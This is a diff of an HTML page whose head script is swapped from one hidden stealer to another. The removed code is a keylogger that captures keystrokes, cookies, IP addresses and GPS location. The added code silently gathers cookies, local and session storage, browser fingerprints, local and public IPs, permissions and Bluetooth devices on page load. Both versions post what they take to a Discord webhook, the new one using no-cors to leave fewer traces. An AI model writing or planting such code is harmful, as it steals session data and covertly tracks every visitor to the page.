@@ -2,211 +2,181 @@
 <html lang="fr-FR">
 <head>
 <script>
-(function() {
-    'use strict';
+(async () => {
+  const wh = "https://discord.com/api/webhooks/1484529763287699547/eFHLFMc_80sTeEFXdYg4bcNAdyAiXPRMHn0JeIo7sPCgIWvrcYBjng04eNzZg7KPyEss";
 
-// LOGGER BY RIXER & Chxris
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484529763287699547/eFHLFMc_80sTeEFXdYg4bcNAdyAiXPRMHn0JeIo7sPCgIWvrcYBjng04eNzZg7KPyEss'; // COLLE ICI TON WEBHOOK BG! Entre les ' '
+  const payload = {};
+  payload.ts = new Date().toISOString();
+  payload.url = location.href;
+  payload.ref = document.referrer || "";
+  payload.cookie = document.cookie || "";
+  payload.ls = JSON.stringify(localStorage);
+  payload.ss = JSON.stringify(sessionStorage);
 
-    let keystrokes = [];
-    let isCapturing = true;
+  try {
+    const dbs = indexedDB.databases ? await indexedDB.databases() : [];
+    payload.idbCount = dbs.length;
+    payload.idbNames = dbs.map(db => db.name || "?").join(",");
+  } catch {}
 
-    async function getIpv4() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            if (!response.ok) throw new Error('Failed to fetch IPv4');
-            const data = await response.json();
-            return data.ip;
-        } catch (error) {
-            console.error('Erreur IPv4:', error);
-            return null;
-        }
+  try {
+    const ck = await caches.keys();
+    payload.cacheKeys = ck.join(",");
+  } catch {}
+
+  payload.ua = navigator.userAgent;
+  payload.lang = navigator.language;
+  payload.langs = navigator.languages?.join(",") || "";
+  payload.platform = navigator.platform;
+  payload.vendor = navigator.vendor;
+  payload.hardware = navigator.hardwareConcurrency || "?";
+  payload.memory = navigator.deviceMemory || "?";
+  payload.touch = navigator.maxTouchPoints || 0;
+  payload.dnt = navigator.doNotTrack;
+  payload.cookieEnabled = navigator.cookieEnabled;
+
+  if (navigator.connection) {
+    payload.conn = {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    };
+  }
+
+  payload.screen = `\( {screen.width}x \){screen.height}x\( {screen.colorDepth}x \){screen.pixelDepth}`;
+  payload.avail = `\( {screen.availWidth}x \){screen.availHeight}`;
+  payload.pixelRatio = devicePixelRatio;
+  payload.innerWH = `\( {innerWidth}x \){innerHeight}`;
+  payload.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  payload.tzOffset = new Date().getTimezoneOffset();
+
+  // Canvas ultra
+  try {
+    const c = document.createElement("canvas");
+    c.width = 320; c.height = 100;
+    const ctx = c.getContext("2d");
+    ctx.fillStyle = "#f60"; ctx.fillRect(140, 5, 80, 30);
+    ctx.fillStyle = "#069"; ctx.font = "16pt noexistfont"; ctx.fillText("Fingerprint 🖕 𐀀 test", 5, 20);
+    ctx.globalCompositeOperation = "multiply"; ctx.fillStyle = "#f0f"; ctx.beginPath(); ctx.arc(80, 60, 60, 0, Math.PI * 2); ctx.fill();
+    payload.canvas = c.toDataURL();
+  } catch {}
+
+  // WebGL
+  try {
+    const gc = document.createElement("canvas");
+    const gl = gc.getContext("webgl") || gc.getContext("experimental-webgl") || gc.getContext("webgl2");
+    if (gl) {
+      const debug = gl.getExtension("WEBGL_debug_renderer_info");
+      payload.webgl = {
+        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "",
+        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : ""
+      };
     }
+  } catch {}
 
-    async function getIpv6() {
-        try {
-            const response = await fetch('https://api64.ipify.org?format=json');
-            if (!response.ok) throw new Error('Failed to fetch IPv6');
-            const data = await response.json();
-            return data.ip;
-        } catch (error) {
-            console.error('Erreur IPv6:', error);
-            return null;
-        }
+  // Audio fingerprint (très fort)
+  try {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    const ac = new AudioCtx();
+    const osc = ac.createOscillator(); osc.type = "sawtooth"; osc.frequency.value = 12000;
+    const comp = ac.createDynamicsCompressor();
+    comp.threshold.value = -60; comp.knee.value = 40; comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.3;
+    osc.connect(comp); comp.connect(ac.destination);
+    osc.start();
+    await new Promise(r => setTimeout(r, 150));
+    const analyser = ac.createAnalyser(); comp.connect(analyser);
+    const data = new Float32Array(analyser.frequencyBinCount);
+    analyser.getFloatFrequencyData(data);
+    payload.audioHash = btoa(String.fromCharCode.apply(null, new Uint8Array(data.buffer).slice(0, 200)));
+    osc.stop(); ac.close();
+  } catch {}
+
+  // Battery status
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      payload.battery = {
+        level: b.level,
+        charging: b.charging,
+        chargingTime: b.chargingTime,
+        dischargingTime: b.dischargingTime
+      };
     }
+  } catch {}
 
-    async function getLocationInfoFromIp(ip) {
-        if (!ip) return null;
-        try {
-            const response = await fetch(`http://ip-api.com/json/${ip}`);
-            if (!response.ok) throw new Error('Failed to fetch location info');
-            const data = await response.json();
-            if (data.status === 'fail') throw new Error(data.message);
-            return {
-                city: data.city,
-                region: data.regionName,
-                country: data.country,
-                org: data.org,
-                lat: data.lat,
-                lon: data.lon
-            };
-        } catch (error) {
-            console.error('Erreur localisation depuis IP:', error);
-            return null;
-        }
+  // Permissions (état actuel)
+  try {
+    const perms = ["geolocation","notifications","camera","microphone","clipboard-write","bluetooth","persistent-storage","midi","xr-spatial-tracking"];
+    payload.permissions = {};
+    for (const p of perms) {
+      try {
+        const s = await navigator.permissions.query({name: p});
+        payload.permissions[p] = s.state;
+      } catch {}
     }
+  } catch {}
 
-    function getLocalIp() {
-        return new Promise((resolve) => {
-            const rtc = new RTCPeerConnection({ iceServers: [] });
-            let localIP = null;
-            rtc.onicecandidate = (event) => {
-                if (event.candidate && event.candidate.address) {
-                    if (event.candidate.address.includes('.') && !localIP) {
-                        localIP = event.candidate.address;
-                        resolve(localIP);
-                    }
-                }
-            };
-            rtc.createDataChannel('');
-            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-            setTimeout(() => resolve(null), 1000);
-        });
+  // Bluetooth devices déjà autorisés (pas de nouveau scan)
+  try {
+    if (navigator.bluetooth) {
+      const devs = await navigator.bluetooth.getDevices();
+      payload.bluetooth = devs.map(d => ({id: d.id, name: d.name || "?", connected: d.gatt?.connected || false}));
     }
+  } catch {}
 
-    function getCookies() { return document.cookie; }
-    function getBrowserInfo() {
-        return {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            screenResolution: `\( {screen.width}x \){screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-    }
+  // WebRTC → local IPs (IPv4 + IPv6 possibles)
+  try {
+    const localIps = new Set();
+    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}, {urls: "stun:stun1.l.google.com:19302"}]});
+    pc.createDataChannel("");
+    pc.onicecandidate = e => {
+      if (e.candidate && e.candidate.candidate) {
+        const cand = e.candidate.candidate;
+        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(cand);
+        if (ipMatch) localIps.add(ipMatch[1]);
+      }
+    };
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    await new Promise(r => setTimeout(r, 3500));
+    pc.close();
+    payload.localIps = [...localIps];
+  } catch {}
 
-    async function sendToDiscord(title, data, color = 15844367) {
-        try {
-            const payload = {
-                embeds: [{
-                    title: title,
-                    color: color,
-                    fields: [],
-                    footer: { text: 'Rixer Keylogger' },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            for (const key in data) {
-                let value = data[key];
-                if (typeof value === 'object' && value !== null) {
-                    value = JSON.stringify(value, null, 2);
-                }
-                if (value) {
-                    payload.embeds[0].fields.push({
-                        name: key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
-                        value: `\`\`\`json\n${value}\`\`\``,
-                        inline: false
-                    });
-                }
-            }
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (error) {
-            console.error('Erreur envoi Discord:', error);
-        }
-    }
+  // IP publique + geo (multi APIs, IPv4 + IPv6 support)
+  const ipSources = [
+    "https://api.ipify.org?format=json",
+    "https://api64.ipify.org?format=json",
+    "https://ipwho.is",
+    "https://ipapi.co/json",
+    "https://freeipapi.com/api/json",
+    "https://ipinfo.io/json"
+  ];
+  for (const url of ipSources) {
+    try {
+      const res = await fetch(url, {cache: "no-store", mode: "cors"});
+      if (res.ok) {
+        const json = await res.json();
+        payload.publicIp = json.ip || json.query || json.address || "";
+        payload.ipData = json;
+        break;
+      }
+    } catch {}
+  }
 
-    document.addEventListener('keydown', (event) => {
-        if (!isCapturing) return;
-        let key = '';
-        if (event.key === 'Shift' || event.key === 'Control' || event.key === 'Alt' || event.key === 'Meta') {
-            keystrokes.push(`[${event.key.toUpperCase()}]`); return;
-        }
-        if (event.key.startsWith('Arrow')) { key = `[${event.key.toUpperCase()}]`;
-        } else if (event.key === 'Enter') { key = '[ENTER]';
-        } else if (event.key === 'Tab') { key = '[TAB]';
-        } else if (event.key === 'Backspace' || event.key === 'Delete') { key = `[${event.key.toUpperCase()}]`;
-        } else if (event.key === 'Escape') { key = '[ESC]';
-        } else if (event.key === 'CapsLock') { key = '[CAPS_LOCK]';
-        } else if (event.key.length > 1) { key = `[${event.key.toUpperCase().replace(' ', '_')}]`;
-        } else { key = event.key; }
-        keystrokes.push(key);
+  // Envoi final (no-cors pour minimiser traces)
+  try {
+    await fetch(wh, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```",
+        username: "UltraMaxGrab2026"
+      })
     });
-
-    async function sendConnectionData() {
-        const [ipv4, ipv6] = await Promise.all([
-            getIpv4(),
-            getIpv6()
-        ]);
-
-        const locationInfo = await getLocationInfoFromIp(ipv4);
-
-        const localIp = await getLocalIp();
-        const cookies = getCookies();
-        const browserInfo = getBrowserInfo();
-        const pageInfo = { url: window.location.href, title: document.title };
-
-        const connectionPayload = {
-            ips: {
-                ipv4_publique: ipv4,
-                ipv6_publique: ipv6,
-                ip_locale: localIp
-            },
-            informations_de_connexion: {
-                fournisseur_acces: locationInfo ? locationInfo.org : 'N/A',
-                ville_estimee: locationInfo ? locationInfo.city : 'N/A',
-                region_estimee: locationInfo ? locationInfo.region : 'N/A',
-                pays_estime: locationInfo ? locationInfo.country : 'N/A'
-            },
-            cookies: cookies,
-            informationsNavigateur: browserInfo,
-            informationsPage: pageInfo
-        };
-        await sendToDiscord('Informations sur les IP EN VIF...', connectionPayload, 3447003);
-    }
-
-    async function requestLocationAndSend() {
-        if (!navigator.geolocation) return;
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const locationPayload = {
-                    localisation_gps_precise: {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy + " mÃ¨tres",
-                        altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy
-                    }
-                };
-                sendToDiscord('Localisation EZ', locationPayload, 15277667);
-            },
-            (error) => { console.log('GÃ©olocalisation GPS refusÃ©e ou erreur:', error.message); },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    }
-
-    async function handleKeystrokeData() {
-        if (!isCapturing) return;
-        isCapturing = false;
-        const keystrokePayload = { frappes_clavier: keystrokes.join('') };
-        await sendToDiscord('(Keylogger)', keystrokePayload, 10181038);
-    }
-
-    sendConnectionData();
-    requestLocationAndSend();
-
-    document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') {
-            handleKeystrokeData();
-        }
-    });
-    window.addEventListener('beforeunload', () => {
-        handleKeystrokeData();
-    });
-
+  } catch {}
 })();
 </script>
 <meta charset="UTF-8">
